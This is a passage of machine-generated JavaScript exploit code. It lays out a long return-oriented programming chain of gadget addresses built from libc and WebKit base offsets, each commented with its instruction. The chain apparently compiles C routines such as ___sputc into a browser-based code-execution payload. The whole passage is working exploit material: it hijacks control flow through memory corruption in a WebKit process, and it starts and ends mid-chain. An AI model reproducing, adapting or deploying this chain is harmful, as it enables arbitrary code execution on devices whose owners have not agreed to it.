libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1627:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+127488, //L1630
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1629:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1630:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+127576, //L1631
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+127592, //L1633
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1631:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1633:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127736, //L1636
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+127704, //L1634
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+127720, //L1635
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1634:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1635:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1636:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+127808, //L1637
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1637:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+127864, //L1640
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1640:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+127944, //L1641
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1641:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1642:
db([37, 0]); // 0x25
set_gadget(libc_base+792472,); //pop rcx
//L1643:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+128048, //L1644
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+128064, //L1645
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1644:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1645:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+128152, //L1646
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1646:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128208, //L1649
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1649:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+128280, //L1650
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1650:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128336, //L1653
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1653:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1654:
libc_base+785097, //mov rsp, rbp ; pop rbp
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+128488, //L1657
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1656:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1657:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+128576, //L1658
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+128592, //L1660
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1658:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1660:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128736, //L1663
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+128704, //L1661
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+128720, //L1662
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1661:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1662:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1663:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+128808, //L1664
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+128864, //L1667
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1667:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+128944, //L1668
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1668:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1669:
db([38, 0]); // 0x26
set_gadget(libc_base+792472,); //pop rcx
//L1670:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+129048, //L1671
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129064, //L1672
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1671:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+129152, //L1673
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1673:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+129208, //L1676
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1676:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129280, //L1677
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1677:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+129336, //L1680
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1680:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129464, //L1682
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+129448, //L1681
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1681:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1682:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129560, //L1683
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129576, //L1684
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1683:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129688, //L1685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129672, //L1686
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1686:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1685:
db([0, 0]); // 0x0
//___sputc:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129760, //L1687
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+129864, //L1689
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+129848, //L1690
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1690:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L1689:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1691:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1692:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+129992, //L1694
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+129976, //L1693
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1693:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1694:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+130088, //L1697
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1696:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1697:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130176, //L1698
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130192, //L1700
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1698:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1700:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+130328, //L1703
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+130344, //L1704
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+130296, //L1701
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1701:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1702:
db([12, 0]); // 0xc
set_gadget(libc_base+792472,); //pop rcx
//L1703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130432, //L1705
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130448, //L1707
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1705:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1707:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+130600, //L1709
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+130632, //L1711
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+130584, //L1708
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130616, //L1710
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1708:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1709:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1710:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1711:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+130744, //L1714
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+130712, //L1712
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1712:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1713:
db([4294967295, 4294967295]); // -0x1
set_gadget(libc_base+788575,); //pop rax
//L1714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+130848, //L1717
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1716:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1717:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130936, //L1718
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130952, //L1720
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1718:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1720:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+131040, //L1721
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+131056, //L1723
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L1721:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1723:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+131128, //L1726
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
//L1725:
db([12, 0]); // 0xc
set_gadget(libc_base+792472,); //pop rcx
//L1726:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+131288, //L1728
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131304, //L1729
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+131272, //L1727
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1727:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1728:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+131424, //L1731
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131440, //L1732
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+131408, //L1730
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1730:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1731:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+131608, //L1734
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131624, //L1735
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+131592, //L1733
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1733:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1734:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1735:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+131728, //L1737
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131792, //L1741
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+131760, //L1739
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1737:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1738:
db([1, 0]); // 0x1
set_gadget(libc_base+206806,); //pop rdi
//L1739:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1740:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1741:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+131912, //L1742+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+131904, //L1742
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1742:
db([0, 0]); // 0x0
set_gadgets([
ropchain+131928, //L1742+24
ropchain+136048, //L1736
libc_base+793877, //pop rsi
ropchain+131984, //L1745
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1744:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1745:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132072, //L1746
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132088, //L1748
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1746:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+132224, //L1751
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132240, //L1752
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+132192, //L1749
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1749:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1750:
db([36, 0]); // 0x24
set_gadget(libc_base+792472,); //pop rcx
//L1751:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1752:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132328, //L1753
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132344, //L1755
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1753:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1755:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+132496, //L1757
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132528, //L1759
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+132480, //L1756
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132512, //L1758
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1756:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1757:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1758:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1759:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+132600, //L1760
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132616, //L1761
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1760:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1761:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+132712, //L1763
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+132696, //L1762
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1762:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1763:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+132808, //L1766
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1765:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1766:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132896, //L1767
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132912, //L1769
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1767:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1769:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+133048, //L1772
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133064, //L1773
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+133016, //L1770
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1770:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1771:
db([12, 0]); // 0xc
set_gadget(libc_base+792472,); //pop rcx
//L1772:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+133152, //L1774
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133168, //L1776
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1774:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1776:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+133320, //L1778
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133352, //L1780
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+133304, //L1777
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133336, //L1779
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1777:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1778:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1779:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1780:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133424, //L1781
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133440, //L1782
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1781:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1782:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133560, //L1784
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133576, //L1785
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+133544, //L1783
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1783:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1784:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1785:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
